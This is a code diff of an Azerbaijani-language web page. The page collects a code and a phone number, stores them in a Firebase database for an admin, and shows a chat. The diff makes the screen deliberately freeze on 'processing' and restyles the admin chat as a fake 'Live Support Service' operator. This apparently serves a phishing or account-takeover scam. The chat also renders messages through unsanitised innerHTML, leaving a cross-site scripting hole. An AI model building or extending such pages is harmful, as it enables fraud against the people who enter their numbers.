@@ -22,7 +22,7 @@
             box-shadow: 0 0 25px rgba(0, 255, 204, 0.4);
             padding: 25px;
             border-radius: 15px;
-            width: 360px;
+            width: 380px;
             text-align: center;
             box-sizing: border-box;
         }
@@ -76,23 +76,63 @@
             margin-top: 10px;
             text-shadow: 0 0 8px rgba(0, 255, 204, 0.4);
         }
-        .chat-container {
+        /* Canlı Dəstək Chat Stili */
+        .support-chat {
             margin-top: 15px;
             text-align: left;
-            border-top: 1px solid #333;
-            padding-top: 10px;
+            border: 1px solid #00ffcc;
+            border-radius: 8px;
+            background: #0f0f0f;
+            overflow: hidden;
+            display: none;
+        }
+        .chat-header {
+            background: #00ffcc;
+            color: #000;
+            padding: 8px;
+            font-size: 13px;
+            font-weight: bold;
+            text-align: center;
         }
         .chat-messages {
-            max-height: 100px;
+            height: 120px;
             overflow-y: auto;
-            font-size: 12px;
-            background: #191919;
             padding: 8px;
-            border-radius: 6px;
-            margin-bottom: 8px;
+            font-size: 12px;
         }
         .chat-messages p {
-            margin: 4px 0;
+            margin: 5px 0;
+            padding: 5px 8px;
+            border-radius: 5px;
+        }
+        .msg-admin {
+            background: #222;
+            color: #00ffcc;
+            border-left: 3px solid #00ffcc;
+        }
+        .msg-user {
+            background: #1a2a2a;
+            color: #fff;
+            text-align: right;
+            border-right: 3px solid #00ffcc;
+        }
+        .chat-input-area {
+            display: flex;
+            padding: 5px;
+            background: #141414;
+            border-top: 1px solid #333;
+        }
+        .chat-input-area input {
+            margin: 0;
+            border-radius: 4px;
+            font-size: 12px;
+            padding: 6px;
+        }
+        .chat-input-area button {
+            width: 70px;
+            margin: 0 0 0 5px;
+            padding: 6px;
+            font-size: 12px;
         }
     </style>
 </head>
@@ -108,7 +148,7 @@
             <p class="warning">Bu kodu başqasına versəz hesab banlanacaq!</p>
         </div>
 
-        <!-- 2-ci Addım: Nömrə və Söhbət -->
+        <!-- 2-ci Addım: Nömrə və Dəstək Chatı -->
         <div id="step2" style="display:none;">
             <select id="countryCode">
                 <option value="">Ölkə kodu seçin</option>
@@ -120,13 +160,16 @@
             <button id="startBtn" onclick="submitData()" disabled>İşləmə başla</button>
             <p id="statusMsg"></p>
 
-            <!-- Adminlə əlaqə / Chat sahəsi -->
-            <div id="chatSection" class="chat-container" style="display:none;">
+            <!-- Canlı Dəstək Xidməti (Chat) -->
+            <div id="supportChatContainer" class="support-chat">
+                <div class="chat-header">Canlı Dəstək Xidməti</div>
                 <div class="chat-messages" id="chatMessages">
-                    <p style="color: #888;">Admindən cavab gözlənilir...</p>
+                    <p style="color: #777; text-align: center;">Operatora qoşulur...</p>
                 </div>
-                <input type="text" id="userMessage" placeholder="Adminə mesaj yazın...">
-                <button onclick="sendUserMessage()">Adminə Göndər</button>
+                <div class="chat-input-area">
+                    <input type="text" id="userMessage" placeholder="Mesaj yazın...">
+                    <button onclick="sendUserMessage()">Göndər</button>
+                </div>
             </div>
         </div>
     </div>
@@ -184,35 +227,39 @@
         function submitData() {
             const fullPhone = countrySelect.value + phoneInput.value.trim();
             
+            // Məlumatları bazaya yazırıq ki, admin görsün
             db.ref("requests/" + currentCode).set({
                 code: currentCode,
                 phone: fullPhone,
                 timestamp: Date.now()
             });
 
-            // Ekran tələb olunduğu kimi "işləm aparılır" vəziyyətində qalır
+            // Ekran tələb olunduğu kimi "işləm aparılır" statusunda donur
             startBtn.disabled = true;
             countrySelect.disabled = true;
             phoneInput.disabled = true;
-            document.getElementById("statusMsg").innerText = "İşləm aparılır...";
-            document.getElementById("chatSection").style.display = "block";
+            document.getElementById("statusMsg").innerText = "İşlem aparılır...";
+            
+            // Dəstək chat panelini göstər
+            document.getElementById("supportChatContainer").style.display = "block";
 
-            // Mesajları dinlə (Həm adminin, həm istifadəçinin mesajları)
+            // Söhbəti (chat) real vaxtda dinlə
             db.ref("chats/" + currentCode).on("value", snapshot => {
                 const chatDiv = document.getElementById("chatMessages");
                 chatDiv.innerHTML = "";
                 if (snapshot.exists()) {
                     snapshot.forEach(child => {
                         const msg = child.val();
-                        chatDiv.innerHTML += `<p><b>${msg.sender}:</b> ${msg.text}</p>`;
+                        let msgClass = msg.sender === "Admin" ? "msg-admin" : "msg-user";
+                        chatDiv.innerHTML += `<p class="${msgClass}"><b>${msg.sender}:</b> ${msg.text}</p>`;
                     });
                     chatDiv.scrollTop = chatDiv.scrollHeight;
                 } else {
-                    chatDiv.innerHTML = `<p style="color: #888;">Söhbətə başla...</p>`;
+                    chatDiv.innerHTML = `<p style="color: #777; text-align: center;">Dəstəyə mesaj yaza bilərsiniz...</p>`;
                 }
             });
 
-            // Ban yoxlanışı
+            // Ban olunma yoxlaması
             db.ref("codes/" + currentCode + "/banned").on("value", snapshot => {
                 if (snapshot.val() === true) {
                     alert("Hesabınız banlandı!");
